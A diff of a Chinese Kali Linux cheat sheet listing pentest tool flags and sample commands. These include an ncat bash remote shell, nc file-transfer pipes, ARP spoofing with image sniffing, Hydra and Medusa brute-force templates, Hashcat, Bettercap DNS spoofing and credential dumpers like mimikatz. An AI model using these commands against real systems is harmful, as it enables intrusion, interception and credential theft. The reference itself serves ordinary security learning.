@@ -3,14 +3,15 @@
 ## 更新升级
 
 ```
-apt-get update                //更新软件包列表库
-apt-get upgrade               //更新安装的软件包
-apt-get dist-upgrade          //根据依赖关系更新
-apt-get clean                 //清除缓存索引
-reboot                        //重启电脑
+apt-get update                  //更新软件包列表库
+apt-get install kali-linux-all  //安装所有kali工具包
+apt-get upgrade                 //更新安装的软件包
+apt-get dist-upgrade            //根据依赖关系更新
+apt-get clean                   //清除缓存索引
+reboot                          //重启电脑
 ```
 
-## Kali 网络问题
+## 网络问题
 
 ```
 service network-manager stop
@@ -23,26 +24,32 @@ service network-manager start
 ```
 service ssh start/restart/stop        #开启/重启/停止ssh服务
 update-rc.d ssh enable/disabled       #开启/关闭ssh服务开机自启动
-leafpad /etc/ssh/sshd_config          #配置SSH
+/etc/ssh/sshd_config                  #配置SSH
 ---------------------------------------------
 PasswordAuthentication yes
 permitrootlogin yes
+---------------------------------------------
+-b <ip>                               #使用本机指定地址作为源地址
+-C                                    #进行数据压缩
+-f                                    #后台执行ssh服务
+-i <mi>                               #指定认证所需的私钥文件
+-g                                    #允许远端主机连接本地转发的端口
+-N                                    #不执行远程命令
+-p <port>                             #指定远程主机的端口
+-X                                    #开启X11转发功能
+-x                                    #关闭X11转发功能
+-L <lport:rhost:rport>                #将本地的某个端口转发到远端机器的指定端口
+-R <rport:lhost:lport>                #将远程主机的某个端口转发到本地的指定端口
+-D <lport>                            #指定本地机器"动态的"应用程序端口转发
 ```
 
-## Apache
-
-```
-service apache2 start/restart/stop    #开启/重启/停止Apache服务
-/var/www/html                         #网站存放路径
-```
-
-## ftp
+## FTP
 
 ```
 service vsftpd start/restart/stop     #开启/重启/停止ftp服务
 /home/ftp                             #文件存放路径
 ------------------------------------
-echo open 192.168.253.130 21>ftp.txt
+echo open 192.168.253.139 21>ftp.txt
 echo ftp>>ftp.txt
 echo 123456>>ftp.txt
 echo bin>>ftp.txt
@@ -52,33 +59,19 @@ echo bye>>ftp.txt
 ftp -s:ftp.txt
 ```
 
-## nc
+## ARP
 
 ```
--h     //显示帮助选项
--l     //绑定并监听传入连接
--p     //指定要使用的端口
--c     //通过/bin/sh 执行给定的命令
--e     //连接后执行程序
--q     //执行完毕X秒后退出
--n     //数字ip,不通过DNS解析
--v     //显示详细信息
--u     //使用UDP模式
--z     //使用扫描模式
-------------------------------------
-A：nc -lp 端口 | 解密方式 > 文件
-B：加密方式 < a.mp4 | nc -nv IP地址 端口 -q 时间
+echo 1 > /proc/sys/net/ipv4/ip_forward            //路由转发
+arpspoof -i eth0 -t 192.168.0.144 192.168.0.1     //arp欺骗
+driftnet -i eth0                                  //图片嗅探
 ```
 
-## ncat
+## Apache
 
 ```
---allow         //只允许给定的主机连接到 ncat
---ssl           //使用 SSL 连接或监听
---keep-open     //在断开连接时保持侦听打开
--------------------------------------
-A：ncat -c bash/cmd --allow IP 地址 -vnl 端口 --ssl
-B：ncat -nv IP 地址 端口 --ssl
+service apache2 start/restart/stop    #开启/重启/停止Apache服务
+/var/www/html                         #网站存放路径
 ```
 
 ## Nmap
@@ -140,6 +133,8 @@ https://192.168.253.130:8834/       #网站地址(可变)
 
 ## Hydra
 
+hydra -l 用户名 -P 密码字典 -t 线程数 -vV -e ns 主机 IP service 服务
+
 ```
 -R                            //继续从上一次进度开始
 -l                            //指定用户名
@@ -153,11 +148,11 @@ https://192.168.253.130:8834/       #网站地址(可变)
 -vV                           //显示详细过程
 -S                            //采用SSL链接
 -s [port]                     //指定非默认端口
----------------------------------------------------------
-hydra -l 用户名 -P 密码字典 -t 线程数 -vV -e ns 主机IP service服务
 ```
 
 ## Medusa
+
+medusa -h 主机 IP -u 用户名 -P 字典 -e ns -f -M service 服务
 
 ```
 -h                              //目标主机名或IP地址
@@ -177,16 +172,21 @@ hydra -l 用户名 -P 密码字典 -t 线程数 -vV -e ns 主机IP service服务
 -s                              //启用SSL
 -O [file]                       //输出成文件
 -v <0-6>                        //显示详细信息
------------------------------------------------------------
-medusa -h 主机IP -u 用户名 -P 字典 -e ns -f -M service服务
 ```
 
-## ARP
+## Hashcat
+
+hashcat -a 0/1/3 -m typeID 字段/文件 字典/暴力 ...
 
 ```
-echo 1 > /proc/sys/net/ipv4/ip_forward            //路由转发
-arpspoof -i eth0 -t 192.168.0.144 192.168.0.1     //arp欺骗
-driftnet -i eth0                                  //图片嗅探
+-a <0/1/2>                      //指定要使用的破解模式,[0-字典攻击,1-组合攻击,3-掩码攻击]
+-m <id>                         //指定要破解的hash类型ID,如果不指定类型默认为MD5
+-o                              //将破解成功的hash输出在指定目录的文件中
+--increment                     //启用增量破解模式
+--increment-min                 //密码最小长度
+--increment-max                 //密码最大长度
+--outfile-format                //指定破解结果的输出格式ID,默认3
+--show                          //显示已经破解的hash及该hash所对应的明文
 ```
 
 ## Bettercap
@@ -210,7 +210,57 @@ set dns.spoof.address desired_IP          //设置要重定向的地址
 set dns.spoof.all true                    //回应任何请求(默认只会回应那些对本地的请求)
 ```
 
-## Window-collect 
+## Great Tools
+
+- nc
+
+```
+-h     //显示帮助选项
+-l     //绑定并监听传入连接
+-p     //指定要使用的端口
+-c     //通过/bin/sh 执行给定的命令
+-e     //连接后执行程序
+-q     //执行完毕X秒后退出
+-n     //数字ip,不通过DNS解析
+-v     //显示详细信息
+-u     //使用UDP模式
+-z     //使用扫描模式
+------------------------------------
+A：nc -lp 端口 | 解密方式 > 文件
+B：加密方式 < a.mp4 | nc -nv IP地址 端口 -q 时间
+```
+
+- ncat
+
+```
+--allow         //只允许给定的主机连接到 ncat
+--ssl           //使用 SSL 连接或监听
+--keep-open     //在断开连接时保持侦听打开
+-------------------------------------
+A：ncat -c bash/cmd --allow IP 地址 -vnl 端口 --ssl
+B：ncat -nv IP 地址 端口 --ssl
+```
+
+## Web Tools
+
+- dirb 目录扫描工具
+
+```
+    dirb <url_base> [<wordlist_file(s)>][options]
+---------------------------------------------------------
+-c <cookie_string>                //设置HTTP请求的cookie
+-H <header_string>                //向HTTP请求添加自定义头
+-i                                //使用不区分大小写的搜索
+-o <output_file>                  //将输出保存到磁盘
+-p <proxy[:port]>                 //使用这个代理(默认端口为1080)
+-P <username:password>            //代理身份验证
+-r                                //不递归搜索
+-R                                //交互式递归(询问每个目录)
+-u <username:password>            //HTTP身份验证
+-z <s>                            //添加一个毫秒的延迟,以避免造成过多的溢出
+```
+
+## Window-collect
 
 - laZagne
 - mimikatz
